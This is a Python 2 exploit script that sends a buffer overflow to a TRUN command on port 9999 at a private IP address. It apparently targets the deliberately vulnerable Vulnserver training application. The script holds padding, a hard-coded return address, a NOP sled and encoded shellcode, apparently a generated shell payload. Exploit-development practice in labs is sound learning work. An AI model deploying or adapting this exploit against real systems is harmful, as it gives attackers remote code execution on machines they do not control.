#!/usr/bin/python
import sys, socket

overflow = (
        "\xd9\xe1\xbd\xb2\xa5\x23\xc4\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x6f\x17\x83\xc7\x04\x03\xdd\xb6\xc1\x31\xdd\x51\x87"
"\xba\x1d\xa2\xe8\x33\xf8\x93\x28\x27\x89\x84\x98\x23\xdf\x28"
"\x52\x61\xcb\xbb\x16\xae\xfc\x0c\x9c\x88\x33\x8c\x8d\xe9\x52"
"\x0e\xcc\x3d\xb4\x2f\x1f\x30\xb5\x68\x42\xb9\xe7\x21\x08\x6c"
"\x17\x45\x44\xad\x9c\x15\x48\xb5\x41\xed\x6b\x94\xd4\x65\x32"
"\x36\xd7\xaa\x4e\x7f\xcf\xaf\x6b\xc9\x64\x1b\x07\xc8\xac\x55"
"\xe8\x67\x91\x59\x1b\x79\xd6\x5e\xc4\x0c\x2e\x9d\x79\x17\xf5"
"\xdf\xa5\x92\xed\x78\x2d\x04\xc9\x79\xe2\xd3\x9a\x76\x4f\x97"
"\xc4\x9a\x4e\x74\x7f\xa6\xdb\x7b\xaf\x2e\x9f\x5f\x6b\x6a\x7b"
"\xc1\x2a\xd6\x2a\xfe\x2c\xb9\x93\x5a\x27\x54\xc7\xd6\x6a\x31"
"\x24\xdb\x94\xc1\x22\x6c\xe7\xf3\xed\xc6\x6f\xb8\x66\xc1\x68"
"\xbf\x5c\xb5\xe6\x3e\x5f\xc6\x2f\x85\x0b\x96\x47\x2c\x34\x7d"
"\x97\xd1\xe1\xd2\xc7\x7d\x5a\x93\xb7\x3d\x0a\x7b\xdd\xb1\x75"
"\x9b\xde\x1b\x1e\x36\x25\xcc\xe1\x6f\x24\x17\x8a\x6d\x26\x36"
"\x16\xfb\xc0\x52\xb6\xad\x5b\xcb\x2f\xf4\x17\x6a\xaf\x22\x52"
"\xac\x3b\xc1\xa3\x63\xcc\xac\xb7\x14\x3c\xfb\xe5\xb3\x43\xd1"
"\x81\x58\xd1\xbe\x51\x16\xca\x68\x06\x7f\x3c\x61\xc2\x6d\x67"
"\xdb\xf0\x6f\xf1\x24\xb0\xab\xc2\xab\x39\x39\x7e\x88\x29\x87"
"\x7f\x94\x1d\x57\xd6\x42\xcb\x11\x80\x24\xa5\xcb\x7f\xef\x21"
"\x8d\xb3\x30\x37\x92\x99\xc6\xd7\x23\x74\x9f\xe8\x8c\x10\x17"
"\x91\xf0\x80\xd8\x48\xb1\xa1\x3a\x58\xcc\x49\xe3\x09\x6d\x14"
"\x14\xe4\xb2\x21\x97\x0c\x4b\xd6\x87\x65\x4e\x92\x0f\x96\x22"
"\x8b\xe5\x98\x91\xac\x2f")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.5', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
